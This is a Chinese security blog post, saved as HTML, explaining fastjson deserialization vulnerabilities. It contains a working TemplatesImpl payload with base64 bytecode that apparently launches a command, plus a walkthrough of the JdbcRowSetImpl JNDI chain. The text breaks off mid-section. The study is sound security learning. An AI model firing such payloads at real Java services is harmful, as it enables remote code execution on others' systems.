@@ -1,0 +1,386 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="fastjson反序列化简介Fastjson 反序列化漏洞的核心在于其 autoType 功能。当 autoType 开启时，Fastjson 会根据 JSON 数据中的 @type 字段来实例化对应的 Java 对象。攻击者可以利用这个特性，将 @type 字段设置为恶意类的名称，并在 JSON 数据中传入恶意类的属性值，从而触发恶意类的 setter 方法，最终导致代码执行。我们知道原生序列化">
+<meta property="og:type" content="article">
+<meta property="og:title" content="fastjson反序列化">
+<meta property="og:url" content="https://hexo.sheep-sys-sudo.top/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/index.html">
+<meta property="og:site_name" content="Sh_eePpppのHEXO">
+<meta property="og:description" content="fastjson反序列化简介Fastjson 反序列化漏洞的核心在于其 autoType 功能。当 autoType 开启时，Fastjson 会根据 JSON 数据中的 @type 字段来实例化对应的 Java 对象。攻击者可以利用这个特性，将 @type 字段设置为恶意类的名称，并在 JSON 数据中传入恶意类的属性值，从而触发恶意类的 setter 方法，最终导致代码执行。我们知道原生序列化">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://sheep321.oss-cn-qingdao.aliyuncs.com/img1/20250918152845680.png">
+<meta property="og:image" content="https://sheep321.oss-cn-qingdao.aliyuncs.com/img1/20250918152853665.png">
+<meta property="og:image" content="https://sheep321.oss-cn-qingdao.aliyuncs.com/img1/20250918152855782.png">
+<meta property="og:image" content="https://sheep321.oss-cn-qingdao.aliyuncs.com/img1/20250918152821956.png">
+<meta property="article:published_time" content="2025-09-18T07:31:42.000Z">
+<meta property="article:modified_time" content="2025-10-24T09:28:01.113Z">
+<meta property="article:author" content="Sh_eePppp">
+<meta property="article:tag" content="java">
+<meta property="article:tag" content="fastjson">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://sheep321.oss-cn-qingdao.aliyuncs.com/img1/20250918152845680.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>fastjson反序列化</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.3.0"><link rel="alternate" href="/atom.xml" title="Sh_eePpppのHEXO" type="application/atom+xml">
+<link rel="stylesheet" href="/css/prism-okaidia.css" type="text/css">
+<link rel="stylesheet" href="/css/prism-line-numbers.css" type="text/css"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="顶部" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">h0me</a></li><!--
+     --><!--
+       --><li><a href="/categories">Categ0r1es</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Artic1es</a></li><!--
+     --><!--
+       --><li><a href="/links/">L1nks</a></li><!--
+     --><!--
+       --><li><a href="/search/">Searh</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="上一篇" href="/%E8%AE%B0cakephp%E6%A1%86%E6%9E%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="下一篇" href="/n1CTF-web-WP/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://hexo.sheep-sys-sudo.top/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://hexo.sheep-sys-sudo.top/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&text=fastjson反序列化"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://hexo.sheep-sys-sudo.top/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&title=fastjson反序列化"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://hexo.sheep-sys-sudo.top/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&is_video=false&description=fastjson反序列化"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=fastjson反序列化&body=Check out this article: https://hexo.sheep-sys-sudo.top/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://hexo.sheep-sys-sudo.top/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&title=fastjson反序列化"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://hexo.sheep-sys-sudo.top/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&title=fastjson反序列化"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://hexo.sheep-sys-sudo.top/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&title=fastjson反序列化"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://hexo.sheep-sys-sudo.top/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&title=fastjson反序列化"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://hexo.sheep-sys-sudo.top/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&name=fastjson反序列化&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://hexo.sheep-sys-sudo.top/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&t=fastjson反序列化"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">1.</span> <span class="toc-text">fastjson反序列化</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AE%80%E4%BB%8B"><span class="toc-number">1.1.</span> <span class="toc-text">简介</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8"><span class="toc-number">1.2.</span> <span class="toc-text">fastjson反序列化利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#fastjson"><span class="toc-number">1.2.1.</span> <span class="toc-text">fastjson&lt;&#x3D;1.2.24</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#TemplateImpl"><span class="toc-number">1.2.1.1.</span> <span class="toc-text">TemplateImpl</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#JdbcRowSetImpl"><span class="toc-number">1.2.1.2.</span> <span class="toc-text">JdbcRowSetImpl</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#BCEL%E5%88%A9%E7%94%A8%E9%93%BE"><span class="toc-number">1.2.1.3.</span> <span class="toc-text">BCEL利用链</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-2-25"><span class="toc-number">1.2.2.</span> <span class="toc-text">1.2.25 &lt;&#x3D; fastjson &lt;&#x3D; 1.2.47</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number">1.3.</span> <span class="toc-text">参考</span></a></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        fastjson反序列化
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">Sh_eePppp</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2025-09-18T07:31:42.000Z" class="dt-published" itemprop="datePublished">2025-09-18</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/Java/">Java</a> › <a class="category-link" href="/categories/Java/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">反序列化</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/fastjson/" rel="tag">fastjson</a>, <a class="p-category" href="/tags/java/" rel="tag">java</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h1 id="fastjson反序列化"><a href="#fastjson反序列化" class="headerlink" title="fastjson反序列化"></a>fastjson反序列化</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>Fastjson 反序列化漏洞的核心在于其 autoType 功能。当 autoType 开启时，Fastjson 会根据 JSON 数据中的 @type 字段来实例化对应的 Java 对象。攻击者可以利用这个特性，将 @type 字段设置为恶意类的名称，并在 JSON 数据中传入恶意类的属性值，从而触发恶意类的 setter 方法，最终导致代码执行。<br>我们知道原生序列化必须实现Serializable接口，而fastjson序列化，不需要显式地实现Serializable接口，主要用到的方法为JSON.toJSONString()，通过该方法将对象序列化为JSON字符串<br>fastjson为了读取并判断传入的值是什么类型，增加了autotype机制导致了漏洞产生。<br>由于要获取json数据详细类型，每次都需要读取@type，而@type可以指定反序列化任意类调用其set，get，is方法，并且由于反序列化的特性，我们可以通过目标类的set方法自由的设置类的属性值。</p>
+<h2 id="fastjson反序列化利用"><a href="#fastjson反序列化利用" class="headerlink" title="fastjson反序列化利用"></a>fastjson反序列化利用</h2><p>反序列化主要用到的是JSON.parseObject&#x2F;JSON.parse<br>鉴于版本更新漏洞修补等缘故，分成两块进行学习  </p>
+<h3 id="fastjson"><a href="#fastjson" class="headerlink" title="fastjson&lt;&#x3D;1.2.24"></a>fastjson&lt;&#x3D;1.2.24</h3><p>简单看一下 </p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">fastjson</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        User user=<span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line">        user.setAge(<span class="number">11</span>);</span><br><span class="line">        user.setName(<span class="string">&quot;张得&quot;</span>);</span><br><span class="line">        String a=JSON.toJSONString(user);</span><br><span class="line">        System.out.println(a);</span><br><span class="line">        User asd=JSON.parseObject(a,User.class);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;执行了getAge方法&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;执行了getName方法&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(<span class="type">int</span> age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">        System.out.println(<span class="string">&quot;执行了setAge方法&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        System.out.println(<span class="string">&quot;执行了setName方法&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+<p>在toJSONString执行时调用了Getter方法<br>把一个对象当作字符串时(调用toString方法)，就会触发getter方法  </p>
+<p>JSON.parseObject方法会再去调用一次原类的Setter方法<br>思考一个问题，现在这个User是我们加入的，实际环境里，fastjson又是如何知道的呢?  </p>
+<p>这里就出现了一个@type属性：@type是fastjson中的一个特殊注解，用于标识JSON字符串中的某个属性是哪个Java对象的类型。具体来说，当fastjson从JSON字符串反序列化为Java对象时，如果JSON字符串中包含@type属性，fastjson会根据该属性的值来确定反序列化后的Java对象的类型。</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a=<span class="string">&quot;&#123;&quot;</span><span class="meta">@type</span>\<span class="string">&quot;:\&quot;User\&quot;,\&quot;name\&quot;:\&quot;admin\&quot;,\&quot;age\&quot;:19&#125;&quot;</span></span><br><span class="line">JSON.parseObject(a);</span><br></pre></td></tr></table></figure></div>
+<p>这样就会调用User的Setter方法进行反序列化<br>这个时候，如果没有任何过滤，那么可以直接反序列化执行恶意命令  </p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">getter 方法需满足条件：方法名长于 <span class="number">4</span>、不是静态方法、以 get 开头且第<span class="number">4</span>位是大写字母、方法不能有参数传入、继承自 Collection|Map|AtomicBoolean|AtomicInteger|AtomicLong、此属性没有 setter 方法。</span><br><span class="line">setter 方法需满足条件：方法名长于 <span class="number">4</span>，以 set 开头且第<span class="number">4</span>位是大写字母、非静态方法、返回类型为 <span class="keyword">void</span> 或当前类、参数个数为 <span class="number">1</span> 个。具体逻辑在 com.alibaba.fastjson.util.JavaBeanInfo.build() 中</span><br><span class="line"></span><br><span class="line">使用 JSON.parseObject(jsonString) 将会返回 JSONObject 对象，且类中setter 都被调用.</span><br><span class="line"></span><br><span class="line">如果目标类中私有变量没有 setter 方法，但是在反序列化时仍想给这个变量赋值，则需要使用 Feature.SupportNonPublicField 参数 </span><br><span class="line"></span><br><span class="line">fastjson 在为类属性寻找 get/set 方法时，调用函数 com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer#smartMatch() 方法，会忽略 _ 字符串，也就是说哪怕你的字段名叫 _a_g_e_，getter 方法为 getAge()，fastjson 也可以找得到</span><br><span class="line"></span><br><span class="line">fastjson 在反序列化时，如果 Field 类型为 <span class="type">byte</span>[]，将会调用com.alibaba.fastjson.parser.JSONScanner#bytesValue 进行 base64 解码，对应的，在序列化时也会进行 base64 编码</span><br></pre></td></tr></table></figure></div>
+
+<h4 id="TemplateImpl"><a href="#TemplateImpl" class="headerlink" title="TemplateImpl"></a>TemplateImpl</h4><p>TemplatesImpl类里面有getter方法，调用后可以动态加载恶意字节码<br>如</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">getOutputProperties</span><br><span class="line">	<span class="title function_">newTransformer</span><span class="params">()</span></span><br><span class="line">		getTransletInstance()</span><br><span class="line">			defineTransletClasses()</span><br><span class="line">				defineClass()</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+<p>那么可以直接利用fastjson反序列化</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">jsonInput</span> <span class="operator">=</span> <span class="string">&quot;&#123;\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;    \&quot;@type\&quot;: \&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\&quot;,\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;    \&quot;_bytecodes\&quot;: [\&quot;yv66vgAAADQAGQEABmdhb3JlbgcAAQEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQHAAMBAAg8Y2xpbml0PgEAAygpVgEABENvZGUBABFqYXZhL2xhbmcvUnVudGltZQcACAEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsMAAoACwoACQAMAQAEY2FsYwgADgEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsMABAAEQoACQASAQAGPGluaXQ+DAAUAAYKAAQAFQEAClNvdXJjZUZpbGUBAAtnYW9yZW4uamF2YQAhAAIABAAAAAAAAgAIAAUABgABAAcAAAAWAAIAAAAAAAq4AA0SD7YAE1exAAAAAAABABQABgABAAcAAAARAAEAAQAAAAUqtwAWsQAAAAAAAQAXAAAAAgAY\&quot;],\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;    \&quot;_name\&quot;: \&quot;sheep\&quot;,\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;    \&quot;_tfactory\&quot;: &#123;&#125;,\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;    \&quot;_outputProperties\&quot;: &#123;&#125;\n&quot;</span> +</span><br><span class="line">            <span class="string">&quot;&#125;&quot;</span>;</span><br><span class="line">JSON.parseObject(jsonInput, Feature.SupportNonPublicField);</span><br></pre></td></tr></table></figure></div>
+<p>当然这里利用到了Feature.SupportNonPublicField允许给私有变量直接复制而不用调用setter方法<br>这个为什么会触发呢?<br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/gaorenyusi/p/18435525">https://www.cnblogs.com/gaorenyusi/p/18435525</a><br>详细看这篇文章  </p>
+<h4 id="JdbcRowSetImpl"><a href="#JdbcRowSetImpl" class="headerlink" title="JdbcRowSetImpl"></a>JdbcRowSetImpl</h4><p>这个类没有学过，简单介绍一下，涉及到了JNDI注入问题  </p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAINTEXT"><figure class="iseeu highlight /plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">JNDI（Java Naming and Directory Interface，Java命名和目录接口）是SUN公司提供的一种标准的Java命名系统接口，JNDI提供统一的客户端API，通过不同的访问提供者接口JNDI服务供应接口(SPI)的实现，由管理者将JNDI API映射为特定的命名服务和目录系统，使得Java应用程序可以和这些命名服务和目录服务之间进行交互。</span><br><span class="line">注入问题又是什么呢?</span><br><span class="line">就是将恶意的Reference类绑定在RMI注册表中，其中恶意引用指向远程恶意的class文件，当用户在JNDI客户端的lookup()函数参数外部可控或Reference类构造方法的classFactoryLocation参数外部可控时，会使用户的JNDI客户端访问RMI注册表中绑定的恶意Reference类，从而加载远程服务器上的恶意class文件在客户端本地执行，最终实现JNDI注入攻击导致远程代码执行</span><br></pre></td></tr></table></figure></div>
+<p>JdbcRowSetImpl 类位于 com.sun.rowset.JdbcRowSetImpl<br>而这个类里面有一个setter方法，可以在fastjson反序列化时候被调用</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAutoCommit</span><span class="params">(<span class="type">boolean</span> var1)</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">     <span class="keyword">if</span> (<span class="built_in">this</span>.conn != <span class="literal">null</span>) &#123;</span><br><span class="line">         <span class="built_in">this</span>.conn.setAutoCommit(var1);</span><br><span class="line">     &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">         <span class="built_in">this</span>.conn = <span class="built_in">this</span>.connect();</span><br><span class="line">         <span class="built_in">this</span>.conn.setAutoCommit(var1);</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure></div>
+<p>这里调用了connect方法  </p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> Connection <span class="title function_">connect</span><span class="params">()</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span>.conn != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.conn;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">this</span>.getDataSourceName() != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">InitialContext</span> <span class="variable">var1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">            <span class="type">DataSource</span> <span class="variable">var2</span> <span class="operator">=</span> (DataSource)var1.lookup(<span class="built_in">this</span>.getDataSourceName());</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">this</span>.getUsername() != <span class="literal">null</span> &amp;&amp; !<span class="built_in">this</span>.getUsername().equals(<span class="string">&quot;&quot;</span>) ? var2.getConnection(<span class="built_in">this</span>.getUsername(), <span class="built_in">this</span>.getPassword()) : var2.getConnection();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NamingException var3) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">SQLException</span>(<span class="built_in">this</span>.resBundle.handleGetObject(<span class="string">&quot;jdbcrowsetimpl.connect&quot;</span>).toString());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.getUrl() != <span class="literal">null</span> ? DriverManager.getConnection(<span class="built_in">this</span>.getUrl(), <span class="built_in">this</span>.getUsername(), <span class="built_in">this</span>.getPassword()) : <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> String <span class="title function_">getDataSourceName</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> dataSource;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVA"><figure class="iseeu highlight /java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setDataSourceName</span><span class="params">(String name)</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (name == <span class="literal">null</span>) &#123;</span><br><span class="line">        dataSource = <span class="literal">null</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (name.equals(<span class="string">&quot;&quot;</span>)) &#123;</span><br><span class="line">       <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">SQLException</span>(<span class="string">&quot;DataSource name cannot be empty string&quot;</span>);</span><br><span class="line">    &#125; <span 